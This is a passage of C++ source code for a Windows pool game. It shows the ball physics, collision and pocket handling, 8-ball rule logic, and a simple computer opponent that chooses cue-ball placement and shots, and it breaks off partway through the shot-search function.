    if (currentGameState == SHOT_IN_PROGRESS) {
        UpdatePhysics();
        CheckCollisions();
        bool pocketed = CheckPockets(); // Store if any ball was pocketed

        if (!AreBallsMoving()) {
            ProcessShotResults(); // Determine next state based on what happened
        }
    }

    // --- NEW: Check if AI needs to act ---
    else if (aiTurnPending && !AreBallsMoving()) {
        // Check if it's genuinely AI's turn state and not mid-shot etc.
        if (currentGameState == PLAYER2_TURN || currentGameState == BREAKING || currentGameState == PRE_BREAK_PLACEMENT) {
            // Only trigger if AI is P2, it's their turn/break, and balls stopped
            if (isPlayer2AI && currentPlayer == 2) {
                // Transition state to show AI is thinking
                currentGameState = AI_THINKING;
                aiTurnPending = false; // Acknowledge the pending flag

                // --- Trigger AI Decision Making ---
                // In a real game loop, you might start a timer here or background thread.
                // For simplicity here, we call it directly. This might pause rendering
                // briefly if AI calculation is slow.
                AIMakeDecision(); // AI calculates and applies shot

                // AIMakeDecision should end by calling ApplyShot, which sets
                // currentGameState = SHOT_IN_PROGRESS
                // If AI fails to find a shot, need to handle that (e.g., pass turn - should be rare)
            }
            else {
                aiTurnPending = false; // Clear flag if conditions not met (e.g. P1's turn somehow)
            }
        }
        else {
            aiTurnPending = false; // Clear flag if not in a state where AI should shoot
        }
    }

    // Other states (AIMING, BALL_IN_HAND, etc.) are handled by input messages
}

// --- Physics and Collision ---
void UpdatePhysics() {
    for (size_t i = 0; i < balls.size(); ++i) {
        Ball& b = balls[i];
        if (!b.isPocketed) {
            b.x += b.vx;
            b.y += b.vy;

            // Apply friction
            b.vx *= FRICTION;
            b.vy *= FRICTION;

            // Stop balls if velocity is very low
            if (GetDistanceSq(b.vx, b.vy, 0, 0) < MIN_VELOCITY_SQ) {
                b.vx = 0;
                b.vy = 0;
            }
        }
    }
}

void CheckCollisions() {
    // --- Corrected Collision Boundaries ---
    // These now represent the actual edges of the playable table surface
    float left = TABLE_LEFT;
    float right = TABLE_RIGHT;
    float top = TABLE_TOP;
    float bottom = TABLE_BOTTOM;

    bool playedWallSoundThisFrame = false; // Prevent sound spam
    bool playedCollideSoundThisFrame = false; // Prevent sound spam

    // Define a radius around pocket centers to check if a ball is near a pocket mouth
    // Use a value slightly larger than the pocket radius to prevent clipping the edge
    const float pocketMouthCheckRadiusSq = (POCKET_RADIUS + BALL_RADIUS) * (POCKET_RADIUS + BALL_RADIUS) * 1.1f; // Check slightly larger area

    for (size_t i = 0; i < balls.size(); ++i) {
        Ball& b1 = balls[i];
        if (b1.isPocketed) continue; // Skip balls already pocketed

        // --- Pre-calculate proximity to pocket centers ---
        // This avoids recalculating distances multiple times for wall checks
        bool nearPocket[6];
        for (int p = 0; p < 6; ++p) {
            nearPocket[p] = GetDistanceSq(b1.x, b1.y, pocketPositions[p].x, pocketPositions[p].y) < pocketMouthCheckRadiusSq;
        }
        // Individual pocket proximity flags for clarity in wall checks
        bool nearTopLeftPocket = nearPocket[0];
        bool nearTopMidPocket = nearPocket[1];
        bool nearTopRightPocket = nearPocket[2];
        bool nearBottomLeftPocket = nearPocket[3];
        bool nearBottomMidPocket = nearPocket[4];
        bool nearBottomRightPocket = nearPocket[5];


        // --- Ball-Wall Collisions (with Pocket Avoidance) ---
        bool collidedWall = false; // Track if any wall collision happened for spin effects

        // Left Wall
        if (b1.x - BALL_RADIUS < left) {
            // Don't bounce if near top-left or bottom-left pocket mouths
            if (!nearTopLeftPocket && !nearBottomLeftPocket) {
                b1.x = left + BALL_RADIUS;
                b1.vx *= -1.0f;
                collidedWall = true;
                if (!playedWallSoundThisFrame) { // --- Play Wall Sound ---
                    //PlaySound(TEXT(""wall.wav""), NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
                    PlaySoundImmediate(TEXT(""wall.wav""));
                    playedWallSoundThisFrame = true;
                } // --- End Sound ---
            } // else: Allow ball to continue towards pocket
        }
        // Right Wall
        if (b1.x + BALL_RADIUS > right) {
            // Don't bounce if near top-right or bottom-right pocket mouths
            if (!nearTopRightPocket && !nearBottomRightPocket) {
                b1.x = right - BALL_RADIUS;
                b1.vx *= -1.0f;
                collidedWall = true;
                if (!playedWallSoundThisFrame) { // --- Play Wall Sound ---
                    //PlaySound(TEXT(""wall.wav""), NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
                    PlaySoundImmediate(TEXT(""wall.wav""));
                    playedWallSoundThisFrame = true;
                } // --- End Sound ---
            } // else: Allow ball to continue towards pocket
        }
        // Top Wall
        if (b1.y - BALL_RADIUS < top) {
            // Don't bounce if near top-left, top-mid, or top-right pocket mouths
            if (!nearTopLeftPocket && !nearTopMidPocket && !nearTopRightPocket) {
                b1.y = top + BALL_RADIUS;
                b1.vy *= -1.0f;
                collidedWall = true;
                if (!playedWallSoundThisFrame) { // --- Play Wall Sound ---
                    //PlaySound(TEXT(""wall.wav""), NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
                    PlaySoundImmediate(TEXT(""wall.wav""));
                    playedWallSoundThisFrame = true;
                } // --- End Sound ---
            } // else: Allow ball to continue towards pocket
        }
        // Bottom Wall
        if (b1.y + BALL_RADIUS > bottom) {
            // Don't bounce if near bottom-left, bottom-mid, or bottom-right pocket mouths
            if (!nearBottomLeftPocket && !nearBottomMidPocket && !nearBottomRightPocket) {
                b1.y = bottom - BALL_RADIUS;
                b1.vy *= -1.0f;
                collidedWall = true;
                if (!playedWallSoundThisFrame) { // --- Play Wall Sound ---
                    //PlaySound(TEXT(""wall.wav""), NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
                    PlaySoundImmediate(TEXT(""wall.wav""));
                    playedWallSoundThisFrame = true;
                } // --- End Sound ---
            } // else: Allow ball to continue towards pocket
        }

        // Optional: Apply simplified spin effect on wall collision IF a bounce occurred
        if (collidedWall) {
            // Simple spin damping/effect (can be refined)
            // Side spin affects vertical velocity on horizontal collision & vice-versa
            if (b1.x <= left + BALL_RADIUS || b1.x >= right - BALL_RADIUS) { // Hit L/R wall
                b1.vy += cueSpinX * b1.vx * 0.05f; // Apply small vertical impulse based on side spin and horizontal velocity
            }
            if (b1.y <= top + BALL_RADIUS || b1.y >= bottom - BALL_RADIUS) { // Hit T/B wall
                b1.vx -= cueSpinY * b1.vy * 0.05f; // Apply small horizontal impulse based on top/bottom spin and vertical velocity
            }
            // Dampen spin after wall hit
            cueSpinX *= 0.7f; // Increase damping maybe
            cueSpinY *= 0.7f;
        }


        // --- Ball-Ball Collisions ---
        for (size_t j = i + 1; j < balls.size(); ++j) {
            Ball& b2 = balls[j];
            if (b2.isPocketed) continue; // Skip pocketed balls

            float dx = b2.x - b1.x;
            float dy = b2.y - b1.y;
            float distSq = dx * dx + dy * dy;
            float minDist = BALL_RADIUS * 2.0f;

            if (distSq > 0 && distSq < minDist * minDist) { // Check distance squared first
                float dist = sqrtf(distSq);
                float overlap = minDist - dist;

                // Normalize collision vector
                float nx = dx / dist;
                float ny = dy / dist;

                // Separate balls to prevent sticking
                // Move each ball half the overlap distance along the collision normal
                b1.x -= overlap * 0.5f * nx;
                b1.y -= overlap * 0.5f * ny;
                b2.x += overlap * 0.5f * nx;
                b2.y += overlap * 0.5f * ny;

                // Relative velocity
                float rvx = b1.vx - b2.vx;
                float rvy = b1.vy - b2.vy;

                // Dot product of relative velocity and collision normal
                // This represents the component of relative velocity along the collision line
                float velAlongNormal = rvx * nx + rvy * ny;

                // Only resolve collision if balls are moving towards each other (dot product > 0)
                if (velAlongNormal > 0) {
                    // --- Play Ball Collision Sound ---
                    if (!playedCollideSoundThisFrame) {
                        //PlaySound(TEXT(""poolballhit.wav""), NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
                        PlaySoundImmediate(TEXT(""poolballhit.wav""));
                        playedCollideSoundThisFrame = true;
                    }
                    // --- End Sound ---
                    // Calculate impulse scalar (simplified - assumes equal mass, perfect elasticity=1.0)
                   // For perfect elastic collision, the impulse magnitude needed is velAlongNormal.
                   // Each ball gets half the impulse if masses are equal, but since we apply to both in opposite directions along the normal,
                   // the change in velocity for each along the normal is 'velAlongNormal'.
                    float impulse = velAlongNormal; // Simplified impulse magnitude along normal

                    // Apply impulse to velocities along the collision normal
                    b1.vx -= impulse * nx;
                    b1.vy -= impulse * ny;
                    b2.vx += impulse * nx;
                    b2.vy += impulse * ny;

                    // Apply spin transfer/effect (Very simplified)
                    if (b1.id == 0 || b2.id == 0) { // If cue ball involved
                        float spinEffectFactor = 0.08f; // Reduced factor maybe
                        // Simple model: Apply a small velocity change perpendicular to the normal based on spin
                        b1.vx += (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor; // Spin effect
                        b1.vy += (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor; // Spin effect (check signs/logic)

                        b2.vx -= (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                        b2.vy -= (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;

                        // Dampen spin after transfer
                        cueSpinX *= 0.85f;
                        cueSpinY *= 0.85f;
                    }
                }
            }
        } // End ball-ball collision loop
    } // End loop through balls
} // End CheckCollisions


bool CheckPockets() {
    bool ballPocketed = false;
    for (size_t i = 0; i < balls.size(); ++i) {
        Ball& b = balls[i];
        if (!b.isPocketed) {
            for (int p = 0; p < 6; ++p) {
                float distSq = GetDistanceSq(b.x, b.y, pocketPositions[p].x, pocketPositions[p].y);
                if (distSq < POCKET_RADIUS * POCKET_RADIUS) {
                    b.isPocketed = true;
                    b.vx = b.vy = 0;
                    pocketedThisTurn.push_back(b.id); // Record pocketed ball ID

                                        // --- Play Pocket Sound ---
                    // Play only once per call to CheckPockets, even if multiple balls sink
                    if (!ballPocketed) {
                        //PlaySound(TEXT(""pocket.wav""), NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
                        PlaySoundImmediate(TEXT(""pocket.wav""));
                        ballPocketed = true; // Set flag so sound doesn't repeat this frame
                    }
                    // --- End Sound ---

                    break; // No need to check other pockets for this ball
                }
            }
        }
    }
    return ballPocketed;
}

bool AreBallsMoving() {
    for (size_t i = 0; i < balls.size(); ++i) {
        if (!balls[i].isPocketed && (balls[i].vx != 0 || balls[i].vy != 0)) {
            return true;
        }
    }
    return false;
}

void RespawnCueBall(bool behindHeadstring) { // 'behindHeadstring' only relevant for initial break placement
    Ball* cueBall = GetCueBall();
    if (cueBall) {
        // Reset position to a default (AI/Human might move it)
        cueBall->x = HEADSTRING_X * 0.5f;
        cueBall->y = TABLE_TOP + TABLE_HEIGHT / 2.0f;
        cueBall->vx = 0;
        cueBall->vy = 0;
        cueBall->isPocketed = false;

        // Ball-In-Hand goes to whoever is currentPlayer after SwitchTurns()
        if (currentPlayer == 1) {
            currentGameState = BALL_IN_HAND_P1;
            aiTurnPending = false;
        }
        else {
            if (isPlayer2AI) {
                currentGameState = PLAYER2_TURN;
                aiTurnPending = true;
            }
            else {
                currentGameState = BALL_IN_HAND_P2;
                aiTurnPending = false;
            }
        }
    }
}

/*
// old version – wrong player gets Ball-in-Hand
        // Set state based on who gets ball-in-hand
        if (currentPlayer == 1) { // Player 1 caused foul, Player 2 gets ball-in-hand
            if (isPlayer2AI) {
                // AI gets ball-in-hand. Set state and trigger AI.
                currentGameState = PLAYER2_TURN; // State remains P2 Turn
                aiTurnPending = true; // AI will handle placement in its logic
            }
            else {
                // Human Player 2 gets ball-in-hand
                currentGameState = BALL_IN_HAND_P2;
            }
        }
        else { // Player 2 caused foul, Player 1 gets ball-in-hand
            currentGameState = BALL_IN_HAND_P1;
            aiTurnPending = false; // Ensure AI flag off if P1 gets ball-in-hand
        }
*/

// --- Game Logic ---

void ApplyShot(float power, float angle, float spinX, float spinY) {
    Ball* cueBall = GetCueBall();
    if (cueBall) {

        // --- Play Cue Strike Sound ---
        // Play sound when shot is actually applied (regardless of human/AI)
        // Check power again? No, assume ApplyShot is only called for valid shots.
        //PlaySound(TEXT(""cue.wav""), NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
        PlaySoundImmediate(TEXT(""cue.wav""));
        // --- End Sound ---

        cueBall->vx = cosf(angle) * power;
        cueBall->vy = sinf(angle) * power;

        // Apply English (Spin) - Simplified effect
        // Top/Bottom spin affects initial roll slightly
        cueBall->vx += sinf(angle) * spinY * 0.5f; // Small effect perpendicular to shot dir
        cueBall->vy -= cosf(angle) * spinY * 0.5f;
        // Side spin affects initial direction slightly
        cueBall->vx -= cosf(angle) * spinX * 0.5f;
        cueBall->vy -= sinf(angle) * spinX * 0.5f;

        // Store spin for later use in collisions/cushions (could decay over time too)
        cueSpinX = spinX;
        cueSpinY = spinY;
    }
}


void ProcessShotResults() {
    bool cueBallPocketed = false;
    bool eightBallPocketed = false;
    bool legalBallPocketed = false; // Player's own ball type
    bool opponentBallPocketed = false; // Opponent's ball type
    bool anyNonCueBallPocketed = false;
    BallType firstPocketedType = BallType::NONE; // Type of the first object ball pocketed
    int firstPocketedId = -1; // ID of the first object ball pocketed

    PlayerInfo& currentPlayerInfo = (currentPlayer == 1) ? player1Info : player2Info;
    PlayerInfo& opponentPlayerInfo = (currentPlayer == 1) ? player2Info : player1Info;

    // Analyze pocketed balls from this shot sequence
    for (int pocketedId : pocketedThisTurn) {
        Ball* b = GetBallById(pocketedId);
        if (!b) continue; // Should not happen

        if (b->id == 0) {
            cueBallPocketed = true;
        }
        else if (b->id == 8) {
            eightBallPocketed = true;
        }
        else {
            anyNonCueBallPocketed = true;
            // Record the FIRST object ball pocketed in this turn
            if (firstPocketedId == -1) {
                firstPocketedId = b->id;
                firstPocketedType = b->type;
            }

            // Check if ball matches player's assigned type (if already assigned)
            if (currentPlayerInfo.assignedType != BallType::NONE) {
                if (b->type == currentPlayerInfo.assignedType) {
                    legalBallPocketed = true;
                }
                else if (b->type == opponentPlayerInfo.assignedType) {
                    opponentBallPocketed = true; // Pocketed opponent's ball
                }
            }
        }
    }

    // --- Game Over Checks --- (Unchanged)
    if (eightBallPocketed) {
        CheckGameOverConditions(eightBallPocketed, cueBallPocketed);
        if (currentGameState == GAME_OVER) return; // Stop processing if game ended
    }

    // --- Foul Checks --- (Unchanged)
    bool turnFoul = false;
    if (cueBallPocketed) {
    //if (cueBallPocketed || opponentBallPocketed) {
        foulCommitted = true;
        turnFoul = true;
    }
    // (Other foul checks like wrong ball first, no rail after contact, etc. could be added here)


    // --- State Transitions ---

    // 1. Break Shot Results (Assigning Colors)
    //    Condition: Colors not assigned AND at least one object ball pocketed AND no scratch
    if (player1Info.assignedType == BallType::NONE && anyNonCueBallPocketed && !cueBallPocketed)
    {
        // --- Added Safeguard ---
        // Ensure the recorded 'firstPocketedType' corresponds to an actual pocketed ball ID this turn.
        bool firstTypeVerified = false;
        for (int id : pocketedThisTurn) {
            if (id == firstPocketedId) {
                firstTypeVerified = true;
                break;
            }
        }

        // Only assign types if the first recorded pocketed ball type is valid and verified
        if (firstTypeVerified && (firstPocketedType == BallType::SOLID || firstPocketedType == BallType::STRIPE))
        {
            AssignPlayerBallTypes(firstPocketedType);

            // Update ball counts based on ALL balls pocketed this turn after assignment
            player1Info.ballsPocketedCount = 0;
            player2Info.ballsPocketedCount = 0;
            for (int id : pocketedThisTurn) {
                Ball* b = GetBallById(id);
                if (b && b->id != 0 && b->id != 8) { // Ignore cue and 8-ball for counts
                    if (b->type == player1Info.assignedType) player1Info.ballsPocketedCount++;
                    else if (b->type == player2Info.assignedType) player2Info.ballsPocketedCount++;
                }
            }

            // Determine if player continues turn: Did they pocket their *newly assigned* type?
            bool pocketedOwnAssignedType = false;
            for (int id : pocketedThisTurn) {
                Ball* b = GetBallById(id);
                if (b && b->id != 0 && b->id != 8 && b->type == currentPlayerInfo.assignedType) {
                    pocketedOwnAssignedType = true;
                    break;
                }
            }

            if (pocketedOwnAssignedType) {
                // Continue turn
                currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                // If AI's turn, ensure flag is set to trigger next move
                if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = true;
            }
            else {
                // Switch turns if they didn't pocket their assigned type on the assigning shot
                SwitchTurns();
            }
        }
        else {
            // If only 8-ball was pocketed on break (and no scratch), or something went wrong.
            // Re-spot 8-ball was handled in CheckGameOverConditions.
            // Treat as end of turn, switch players.
            SwitchTurns();
        }

    }
    // 2. Normal Play Results (Colors already assigned)
    else {
        // Update pocketed counts for assigned types
        // (Do this even if foul, as balls are off the table)
        int p1NewlyPocketed = 0;
        int p2NewlyPocketed = 0;
        for (int id : pocketedThisTurn) {
            Ball* b = GetBallById(id);
            if (!b || b->id == 0 || b->id == 8) continue;
            if (b->type == player1Info.assignedType) p1NewlyPocketed++;
            else if (b->type == player2Info.assignedType) p2NewlyPocketed++;
        }
        // Only update counts if not already game over state (prevents double counting on winning 8ball shot)
        if (currentGameState != GAME_OVER) {
            player1Info.ballsPocketedCount += p1NewlyPocketed;
            player2Info.ballsPocketedCount += p2NewlyPocketed;
        }


        // Decide next turn based on foul or legal pocket
        if (turnFoul) {
            // Pass turn, give opponent ball-in-hand
            SwitchTurns();
            RespawnCueBall(false); // Ball in hand for opponent
        }
        else if (legalBallPocketed) {
            // Player legally pocketed their own ball, continue turn
            currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
            // If AI's turn, make sure it knows to go again
            if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = true;
        }
        else {
            // No legal ball pocketed or only opponent ball pocketed without foul.
            SwitchTurns();
        }
    }

    // --- Cleanup for next shot ---
    // Clear the list of balls pocketed *in this specific shot sequence*
    pocketedThisTurn.clear();
}

void AssignPlayerBallTypes(BallType firstPocketedType) {
    if (firstPocketedType == BallType::SOLID || firstPocketedType == BallType::STRIPE) {
        if (currentPlayer == 1) {
            player1Info.assignedType = firstPocketedType;
            player2Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
        }
        else {
            player2Info.assignedType = firstPocketedType;
            player1Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
        }
    }
    // If 8-ball was first (illegal on break generally), rules vary.
    // Here, we might ignore assignment until a solid/stripe is pocketed legally.
    // Or assign based on what *else* was pocketed, if anything.
    // Simplification: Assignment only happens on SOLID or STRIPE first pocket.
}

void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
    if (!eightBallPocketed) return; // Only proceed if 8-ball was pocketed

    PlayerInfo& currentPlayerInfo = (currentPlayer == 1) ? player1Info : player2Info;
    bool playerClearedBalls = (currentPlayerInfo.assignedType != BallType::NONE && currentPlayerInfo.ballsPocketedCount >= 7);

    // Loss Conditions:
    // 1. Pocket 8-ball AND scratch (pocket cue ball)
    // 2. Pocket 8-ball before clearing own color group
    if (cueBallPocketed || (!playerClearedBalls && currentPlayerInfo.assignedType != BallType::NONE)) {
        gameOverMessage = (currentPlayer == 1) ? L""Player 2 Wins! (Player 1 fouled on 8-ball)"" : L""Player 1 Wins! (Player 2 fouled on 8-ball)"";
        currentGameState = GAME_OVER;
    }
    // Win Condition:
    // 1. Pocket 8-ball legally after clearing own color group
    else if (playerClearedBalls) {
        gameOverMessage = (currentPlayer == 1) ? L""Player 1 Wins!"" : L""Player 2 Wins!"";
        currentGameState = GAME_OVER;
    }
    // Special case: 8 ball pocketed on break. Usually re-spot or re-rack.
    // Simple: If it happens during assignment phase, treat as foul, respawn 8ball.
    else if (player1Info.assignedType == BallType::NONE) {
        Ball* eightBall = GetBallById(8);
        if (eightBall) {
            eightBall->isPocketed = false;
            // Place 8-ball on foot spot (approx RACK_POS_X) or center if occupied
            eightBall->x = RACK_POS_X;
            eightBall->y = RACK_POS_Y;
            eightBall->vx = eightBall->vy = 0;
            // Check overlap and nudge if necessary (simplified)
        }
        // Apply foul rules if cue ball was also pocketed
        if (cueBallPocketed) {
            foulCommitted = true;
            // Don't switch turns on break scratch + 8ball pocket? Rules vary.
            // Let's make it a foul, switch turns, ball in hand.
            SwitchTurns();
            RespawnCueBall(false); // Ball in hand for opponent
        }
        else {
            // Just respawned 8ball, continue turn or switch based on other balls pocketed.
            // Let ProcessShotResults handle turn logic based on other pocketed balls.
        }
        // Prevent immediate game over message by returning here
        return;
    }


}


void SwitchTurns() {
    currentPlayer = (currentPlayer == 1) ? 2 : 1;
    // Reset aiming state for the new player
    isAiming = false;
    shotPower = 0;
    // Reset foul flag before new turn *really* starts (AI might take over)
    // Foul flag is mainly for display, gets cleared before human/AI shot
    // foulCommitted = false; // Probably better to clear before ApplyShot

    // Set the correct state based on who's turn it is
    if (currentPlayer == 1) {
        currentGameState = PLAYER1_TURN;
        aiTurnPending = false; // Ensure AI flag is off for P1
    }
    else { // Player 2's turn
        if (isPlayer2AI) {
            currentGameState = PLAYER2_TURN; // State indicates it's P2's turn
            aiTurnPending = true;           // Set flag for GameUpdate to trigger AI
            // AI will handle Ball-in-Hand logic if necessary within its decision making
        }
        else {
            currentGameState = PLAYER2_TURN; // Human P2
            aiTurnPending = false;
        }
    }
}

// --- Helper Functions ---

Ball* GetBallById(int id) {
    for (size_t i = 0; i < balls.size(); ++i) {
        if (balls[i].id == id) {
            return &balls[i];
        }
    }
    return nullptr;
}

Ball* GetCueBall() {
    return GetBallById(0);
}

float GetDistance(float x1, float y1, float x2, float y2) {
    return sqrtf(GetDistanceSq(x1, y1, x2, y2));
}

float GetDistanceSq(float x1, float y1, float x2, float y2) {
    float dx = x2 - x1;
    float dy = y2 - y1;
    return dx * dx + dy * dy;
}

bool IsValidCueBallPosition(float x, float y, bool checkHeadstring) {
    // Basic bounds check (inside cushions)
    float left = TABLE_LEFT + CUSHION_THICKNESS + BALL_RADIUS;
    float right = TABLE_RIGHT - CUSHION_THICKNESS - BALL_RADIUS;
    float top = TABLE_TOP + CUSHION_THICKNESS + BALL_RADIUS;
    float bottom = TABLE_BOTTOM - CUSHION_THICKNESS - BALL_RADIUS;

    if (x < left || x > right || y < top || y > bottom) {
        return false;
    }

    // Check headstring restriction if needed
    if (checkHeadstring && x >= HEADSTRING_X) {
        return false;
    }

    // Check overlap with other balls
    for (size_t i = 0; i < balls.size(); ++i) {
        if (balls[i].id != 0 && !balls[i].isPocketed) { // Don't check against itself or pocketed balls
            if (GetDistanceSq(x, y, balls[i].x, balls[i].y) < (BALL_RADIUS * 2.0f) * (BALL_RADIUS * 2.0f)) {
                return false; // Overlapping another ball
            }
        }
    }

    return true;
}


template <typename T>
void SafeRelease(T** ppT) {
    if (*ppT) {
        (*ppT)->Release();
        *ppT = nullptr;
    }
}

// --- Helper Function for Line Segment Intersection ---
// Finds intersection point of line segment P1->P2 and line segment P3->P4
// Returns true if they intersect, false otherwise. Stores intersection point in 'intersection'.
bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection)
{
    float denominator = (p4.y - p3.y) * (p2.x - p1.x) - (p4.x - p3.x) * (p2.y - p1.y);

    // Check if lines are parallel or collinear
    if (fabs(denominator) < 1e-6) {
        return false;
    }

    float ua = ((p4.x - p3.x) * (p1.y - p3.y) - (p4.y - p3.y) * (p1.x - p3.x)) / denominator;
    float ub = ((p2.x - p1.x) * (p1.y - p3.y) - (p2.y - p1.y) * (p1.x - p3.x)) / denominator;

    // Check if intersection point lies on both segments
    if (ua >= 0.0f && ua <= 1.0f && ub >= 0.0f && ub <= 1.0f) {
        intersection.x = p1.x + ua * (p2.x - p1.x);
        intersection.y = p1.y + ua * (p2.y - p1.y);
        return true;
    }

    return false;
}

void PlaySoundImmediate(const wchar_t* soundFile) {
    PlaySound(soundFile, NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
}

// --- NEW AI Implementation Functions ---

// Main entry point for AI turn
void AIMakeDecision() {
    Ball* cueBall = GetCueBall();
    if (!cueBall || !isPlayer2AI || currentPlayer != 2) return; // Safety checks

    // Handle Ball-in-Hand placement first if necessary
    if (currentGameState == PRE_BREAK_PLACEMENT || currentGameState == BALL_IN_HAND_P2) {
        AIPlaceCueBall();
        // After placement, state should transition to PLAYER2_TURN or BREAKING
        currentGameState = (player1Info.assignedType == BallType::NONE) ? BREAKING : PLAYER2_TURN;
    }

    // Now find the best shot from the current position
    AIShotInfo bestShot = AIFindBestShot();

    if (bestShot.possible) {
        // Add slight delay maybe? For now, shoot immediately.
        // Apply calculated shot
        ApplyShot(bestShot.power, bestShot.angle, 0.0f, 0.0f); // AI doesn't use spin yet

        // Set state to shot in progress (ApplyShot might do this already)
        currentGameState = SHOT_IN_PROGRESS;
        foulCommitted = false; // Reset foul flag for AI shot
        pocketedThisTurn.clear(); // Clear previous pockets
    }
    else {
        // AI couldn't find any shot (highly unlikely with simple logic, but possible)
        // Safety shot? Push cue ball gently? Forfeit turn?
        // Simplest: Just tap the cue ball gently forward as a safety/pass.
        ApplyShot(MAX_SHOT_POWER * 0.1f, 0.0f, 0.0f, 0.0f); // Gentle tap forward
        currentGameState = SHOT_IN_PROGRESS;
        foulCommitted = false;
        pocketedThisTurn.clear();
        // NOTE: This might cause a foul if no ball is hit. Harder AI would handle this better.
    }
    aiTurnPending = false; // Ensure flag is off after decision
}

// AI logic for placing cue ball during ball-in-hand
void AIPlaceCueBall() {
    Ball* cueBall = GetCueBall();
    if (!cueBall) return;

    // Simple Strategy: Find the easiest possible shot for the AI's ball type
    // Place the cue ball directly behind that target ball, aiming straight at a pocket.
    // (More advanced: find spot offering multiple options or safety)

    AIShotInfo bestPlacementShot = { false };
    D2D1_POINT_2F bestPlacePos = D2D1::Point2F(HEADSTRING_X * 0.5f, RACK_POS_Y); // Default placement

    BallType targetType = player2Info.assignedType;
    bool canTargetAnyPlacement = false; // Local scope variable for placement logic
    if (targetType == BallType::NONE) {
        canTargetAnyPlacement = true;
    }
    bool target8Ball = (!canTargetAnyPlacement && targetType != BallType::NONE && player2Info.ballsPocketedCount >= 7);
    if (target8Ball) targetType = BallType::EIGHT_BALL;


    for (auto& targetBall : balls) {
        if (targetBall.isPocketed || targetBall.id == 0) continue;

        // Determine if current ball is a valid target for placement consideration
        bool currentBallIsValidTarget = false;
        if (target8Ball && targetBall.id == 8) currentBallIsValidTarget = true;
        else if (canTargetAnyPlacement && targetBall.id != 8) currentBallIsValidTarget = true;
        else if (!canTargetAnyPlacement && !target8Ball && targetBall.type == targetType) currentBallIsValidTarget = true;

        if (!currentBallIsValidTarget) continue; // Skip if not a valid target

        for (int p = 0; p < 6; ++p) {
            // Calculate ideal cue ball position: straight line behind target ball aiming at pocket p
            float targetToPocketX = pocketPositions[p].x - targetBall.x;
            float targetToPocketY = pocketPositions[p].y - targetBall.y;
            float dist = sqrtf(targetToPocketX * targetToPocketX + targetToPocketY * targetToPocketY);
            if (dist < 1.0f) continue; // Avoid division by zero

            float idealAngle = atan2f(targetToPocketY, targetToPocketX);
            // Place cue ball slightly behind target ball along this line
            float placeDist = BALL_RADIUS * 3.0f; // Place a bit behind
            D2D1_POINT_2F potentialPlacePos = D2D1::Point2F( // Use factory function
                targetBall.x - cosf(idealAngle) * placeDist,
                targetBall.y - sinf(idealAngle) * placeDist
            );

            // Check if this placement is valid (on table, behind headstring if break, not overlapping)
            bool behindHeadstringRule = (currentGameState == PRE_BREAK_PLACEMENT);
            if (IsValidCueBallPosition(potentialPlacePos.x, potentialPlacePos.y, behindHeadstringRule)) {
                // Is path from potentialPlacePos to targetBall clear?
                // Use D2D1::Point2F() factory function here
                if (IsPathClear(potentialPlacePos, D2D1::Point2F(targetBall.x, targetBall.y), 0, targetBall.id)) {
                    // Is path from targetBall to pocket clear?
                    // Use D2D1::Point2F() factory function here
                    if (IsPathClear(D2D1::Point2F(targetBall.x, targetBall.y), pocketPositions[p], targetBall.id, -1)) {
                        // This seems like a good potential placement. Score it?
                        // Easy AI: Just take the first valid one found.
                        bestPlacePos = potentialPlacePos;
                        goto placement_found; // Use goto for simplicity in non-OOP structure
                    }
                }
            }
        }
    }

placement_found:
    // Place the cue ball at the best found position (or default if none found)
    cueBall->x = bestPlacePos.x;
    cueBall->y = bestPlacePos.y;
    cueBall->vx = 0;
    cueBall->vy = 0;
}


// AI finds the best shot available on the table
AIShotInfo AIFindBestShot() {
    AIShotInfo bestShotOverall = { false };
    Ball* cueBall = GetCueBall();
    if (!cueBall) return bestShotOverall;

    // Determine target ball type for AI (Player 2)
    BallType targetType = player2Info.assignedType;
    bool canTargetAny = false; // Can AI hit any ball (e.g., after break, before assignment)?
    if (targetType == BallType::NONE) {
        // If colors not assigned, AI aims to pocket *something* (usually lowest numbered ball legally)
        // Or, more simply, treat any ball as a potential target to make *a* pocket
        canTargetAny = true; // Simplification: allow targeting any non-8 ball.
        // A better rule is hit lowest numbered ball first on break follow-up.
    }

    // Check if AI needs to shoot the 8-ball
    bool target8Ball = (!canTargetAny && targetType != BallType::NONE && player2Info.ballsPocketedCount >= 7);


    // Iterate through all potential target balls
    for (auto& potentialTarget : balls) {
        if (potentialTarget.isPocketed || potentialTarget.id == 0) continue; // Skip pocketed and cue ball

        // Check if this ball is a valid target
        bool isValidTarget = false;
        if (target8Ball) {
            isValidTarget = (potentialTarget.id == 8);
        }
        else if (canTargetAny) {
            isValidTarget = (potentialTarget.id != 8); // Can hit any non-8 ball
        }
        else { // Colors assigned, not yet shooting 8-ball
            isValidTarget = (potentialTarget.type == targetType);
        }

        if (!isValidTarget) continue; // Skip if not a valid target for this turn

        // Now, check all pockets for this target ball
        for (int p = 0; p < 6; ++p) {
            AIShotInfo currentShot = EvaluateShot(&potentialTarget, p);
            currentShot.involves8Ball = (potentialTarget.id == 8);

            if (currentShot.possible) {
                // Compare scores to find the best shot
                if (!bestShotOverall.possible || currentShot.score > bestShotOverall.score) {
                    bestShotOverall = currentShot;
                }
            }
        }
